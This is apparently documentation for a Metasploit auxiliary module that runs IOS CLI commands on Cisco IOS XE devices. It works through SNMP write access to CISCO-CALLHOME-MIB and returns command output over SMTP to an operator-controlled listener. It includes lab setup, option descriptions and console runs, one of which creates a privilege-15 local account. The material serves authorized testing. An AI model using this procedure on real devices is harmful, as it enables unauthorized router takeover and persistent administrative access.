## Vulnerable Application

This module uses valid SNMP write access to execute IOS CLI commands through
the on-demand CLI objects in `CISCO-CALLHOME-MIB`. Command output is received
through a temporary SMTP-server row, displayed in the console, and saved as
loot. `EXECUTE` runs an operator-supplied command list; `CREATE_ACCOUNT` creates
a local IOS account with privilege level 15. The module does not open a
Metasploit session.

With Call Home AAA authorization disabled, testing observed privilege level 15
execution even when global Call Home was disabled. When Call Home AAA
authorization is enabled, command authority depends on its configured identity;
an authorization bypass has not been established for that configuration.

The command path was tested on Cisco C8000V IOS XE 17.6.5 and 17.9.6. The module
detects live MIB objects rather than relying on a software-version or model
match. Support for other releases and hardware platforms must be verified;
these objects may not be instantiated on later releases. No complete affected
version range or fixed release has been established by this research.

### Lab setup

Use a Cisco IOS XE lab device with readable on-demand CLI objects and SNMP
write access to the Call Home subtree (`1.3.6.1.4.1.9.9.300`). The module also
reads `SNMPv2-MIB::sysDescr.0`. An SNMPv2c lab can be configured with a
read-write community:

```
configure terminal
snmp-server community <community> RW
end
```

The following SNMPv3 `authPriv` lab example uses a full-tree write view, SHA-1
authentication, and AES-128 privacy:

```
configure terminal
snmp-server view CH-WRITE 1 included
snmp-server group CH-GROUP v3 priv write CH-WRITE
snmp-server user CH-USER CH-GROUP v3 auth sha <auth-password> priv aes 128 <privacy-password>
end
```

Match those credentials and protocols in the module:

```
set VERSION 3
set SNMPV3::USERNAME CH-USER
set SNMPV3::SECURITY_LEVEL authPriv
set SNMPV3::AUTH_PROTOCOL SHA1
set SNMPV3::AUTH_PASSWORD <auth-password>
set SNMPV3::PRIV_PASSWORD <privacy-password>
```

IOS `auth sha` selects SHA-1. The module's inherited authentication default is
`SHA256`, so the explicit `SHA1` setting is required for this example. A device
configured for SHA-256 instead requires `SNMPV3::AUTH_PROTOCOL SHA256`. Use
`show advanced` to inspect the inherited SNMPv3 settings.

### SMTP connectivity

The IOS XE device must initiate TCP/25 to the Metasploit SMTP receiver. Run
Metasploit with permission to bind that port and ensure it is available locally.
The listener and the temporary Cisco SMTP row both use fixed port 25. The tested
IOS XE implementation does not allow the active row's port to be changed.

Set `SRVHOST` to the local IPv4 listener address, or leave its default
`0.0.0.0` to bind all local interfaces. Set the required `LHOST` to a concrete
IPv4 address reachable from the device; it has no default. When the receiver is
behind NAT, forward TCP/25 from `LHOST` to the listener on TCP/25.

The selected callback address must not already have a Call Home SMTP row. The
module refuses to overwrite that row even when `ALLOW_EXISTING_SMTP` is enabled.
Before CLI execution, IOS XE must successfully validate the exact temporary
SMTP row used by the operation.

### Automatic check and cleanup

The automatic check does not trigger CLI execution. It reversibly changes the
CLI command control, creates the temporary SMTP row, uses the MIB's SMTP status
operation to validate outbound SMTP connectivity, then restores the command
control and deletes the row. It performs SNMP writes and opens the local SMTP
listener, so it requires the same credentials and callback configuration as
`run`. If the serialized service is busy, `check` reports that condition without
performing its writable probes; `run` waits up to `READY_TIMEOUT` for readiness.

On success or failure, the module attempts to restore its captured Call Home
controls and remove only its temporary SMTP row. It verifies those changes by
reading them back and reports a failure if restoration cannot be confirmed.
Call Home event counters and device logs can still reflect the operation.

Cleanup does not reverse the effects of IOS CLI commands. In particular,
`CREATE_ACCOUNT` leaves the new account in running configuration and does not
save it to startup configuration. Account removal is a separate operator task.
A callback timeout does not prove that the submitted CLI commands failed to
execute; inspect the resulting device state before repeating a changing command.

### Stability and side effects

The module declares `SERVICE_RESOURCE_LOSS`, `IOC_IN_LOGS`, `CONFIG_CHANGES`, and
`EVENT_DEPENDENT`. Call Home serializes on-demand requests. A command that waits
for confirmation or other interactive input can leave that service busy beyond
the configured timeout, and a failed delivery can delay later requests. Use
only non-interactive IOS CLI commands and avoid concurrent on-demand operations.

## Verification Steps

1. Configure an authorized Cisco IOS XE test device with SNMP write access.
1. Start `msfconsole` with permission to bind TCP/25.
1. Do: `use auxiliary/admin/networking/cisco_snmp_callhome_cli_exec`
1. Do: `set RHOSTS <target>`
1. Do: `set VERSION 2c`
1. Do: `set COMMUNITY <read-write-community>`
1. Alternatively, configure the SNMPv3 settings described above.
1. Do: `set ACTION EXECUTE`
1. Do: `set CMD show privilege`
1. Do: `set SRVHOST <local-listener-address>`
1. Do: `set LHOST <device-reachable-listener-ipv4>`
1. Do: `check`
1. Confirm that writable controls and the SMTP path are available and that
   temporary state restoration was confirmed.
1. Do: `run`
1. Confirm that privilege 15 output is displayed and saved as loot.
1. Confirm that the module reports `Temporary CISCO-CALLHOME-MIB state restored`.

To verify `CREATE_ACCOUNT`, configure the same target, SNMP, and callback
settings, then set `ACTION CREATE_ACCOUNT`, `USERNAME`, and `PASSWORD` before
running the module. Independently verify the resulting account and remove it
after testing. The module does not verify SSH authentication or configure SSH
access. Review the `PASSWORD` option before sharing console output or loot.

## Options

### ACTION

`EXECUTE` sends the command list in `CMD` and is the default.
`CREATE_ACCOUNT` enters configuration mode, creates a privilege 15 IOS account,
returns to exec mode, and requests the corresponding running-configuration
entry. `CMD` is used only by `EXECUTE`.

### USERNAME

The IOS local username created by `CREATE_ACCOUNT`. Required for that action;
it has no default. Only letters, digits, underscores, dashes, and dots are
accepted. The action sets the supplied account's password and privilege, so use
a new username to avoid changing an existing account.

### PASSWORD

The IOS local account password. Required for `CREATE_ACCOUNT`; it has no default.
Whitespace, semicolons, single or double quotes, and control characters are
rejected. The entire generated command list, including the username and
password, must fit within the 127-byte limit.

The action prints the created username and password. Submitted command text and
output can also appear in SMTP messages and saved loot. Remove credentials from
console transcripts and loot before attaching them to a pull request.

### CMD

One or more semicolon-delimited IOS CLI commands for `EXECUTE`. Command output
is returned through SMTP, printed, and saved as loot. The tested IOS XE
implementation accepts at most 127 bytes, and the module enforces that limit
after normalizing the command list. Carriage returns, line feeds, and NUL bytes
are rejected. These are IOS CLI commands; Linux shell syntax is not supported
directly. Commands that pause for confirmation or other interactive input can
block the serialized Call Home service and must not be used. (Default:
`show privilege`)

### VERSION

The SNMP protocol version: `1`, `2c`, or `3`. Existing Call Home execution
evidence covers SNMPv2c and SNMPv3; SNMPv1 remains an accepted option requiring
separate functional validation. (Default: `2c`)

### COMMUNITY

The SNMPv1 or SNMPv2c read-write community. It is ignored for SNMPv3.
(Default: `private`)

### SNMPV3 options

These inherited advanced options apply when `VERSION` is `3`:

| Option | Purpose and default |
| --- | --- |
| `SNMPV3::USERNAME` | Required USM username; no default. |
| `SNMPV3::SECURITY_LEVEL` | `noAuthNoPriv`, `authNoPriv`, or `authPriv`; default `authPriv`. |
| `SNMPV3::AUTH_PROTOCOL` | `MD5`, `SHA1`, `SHA224`, `SHA256`, `SHA384`, or `SHA512`; default `SHA256`. |
| `SNMPV3::AUTH_PASSWORD` | Authentication password; required when authentication is enabled. |
| `SNMPV3::PRIV_PASSWORD` | Privacy password; required for `authPriv`. |
| `SNMPV3::CONTEXT_NAME` | SNMP context name; default is empty. |

For `authPriv`, the SNMP library uses AES-128 privacy internally. There is no
privacy-protocol option to configure.

### SMTP receiver routing

`SRVHOST` is the local IPv4 address on which the module binds its SMTP receiver.
(Default: `0.0.0.0`)

`LHOST` is the required IPv4 address placed in the temporary Cisco SMTP row. It
has no default because it must be reachable from the IOS XE device.

Both endpoints use fixed TCP/25; there is no configurable SMTP port option.

### SNMP request timing

`TIMEOUT` controls the timeout for each SNMP request in seconds (default `5`).
`RETRIES` controls SNMP request retries (default `3`). These settings are
independent of the service-readiness and SMTP callback deadlines.

### READY_TIMEOUT

Maximum time to wait for the serialized on-demand service to become ready. A
failed or unfinished prior request can keep it busy. (Default: `600` seconds)

### CALLBACK_TIMEOUT

Maximum time for the SMTP receiver to accept the Call Home response. The wait
for its result queue is bounded to this value plus five seconds. IOS XE also
performs a separate SMTP availability preflight with a 30-second deadline
before CLI execution. (Default: `180` seconds)

### ALLOW_EXISTING_SMTP

By default, execution refuses to proceed when other SMTP rows exist because
command text, credentials, and output could be delivered to those servers.
Setting this option to `true` permits those other rows without changing their
priority or removing them; delivery to the temporary row is not guaranteed.
It still does not permit overwriting a row for the selected `LHOST`. This check
is performed by `run`; a successful `check` alone does not confirm that no other
SMTP destinations exist. (Default: `false`)

## Scenarios

### Cisco C8000V IOS XE 17.9.6 with SNMPv2c

```
msf > use auxiliary/admin/networking/cisco_snmp_callhome_cli_exec
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set RHOSTS 192.0.2.10
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set COMMUNITY private
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set ACTION EXECUTE
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set CMD show privilege
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set SRVHOST 192.0.2.20
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set LHOST 192.0.2.20
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > run
[*] SMTP receiver listening on 192.0.2.20:25; advertising 192.0.2.20:25
[+] IOS XE verified the temporary SMTP server without CLI execution
[*] Trigger Call Home CLI execution: sending SNMP SET with 1 varbinds
[+] Received Call Home SMTP message from 192.0.2.10
[+] Temporary CISCO-CALLHOME-MIB state restored
[+] IOS CLI output:
$ show privilege
Current privilege level is 15
```

### Create a privilege 15 account

```
msf > use auxiliary/admin/networking/cisco_snmp_callhome_cli_exec
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set RHOSTS 192.0.2.10
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set VERSION 3
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set ACTION CREATE_ACCOUNT
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set SNMPV3::USERNAME CH-USER
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set SNMPV3::AUTH_PROTOCOL SHA1
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set SNMPV3::AUTH_PASSWORD <auth-password>
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set SNMPV3::PRIV_PASSWORD <privacy-password>
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set USERNAME msfadmin
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set PASSWORD <new-password>
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > set LHOST 192.0.2.20
msf auxiliary(admin/networking/cisco_snmp_callhome_cli_exec) > run
```

The created account changes only running configuration and is not removed when
the temporary Call Home MIB state is restored. The module never saves it to
startup configuration.
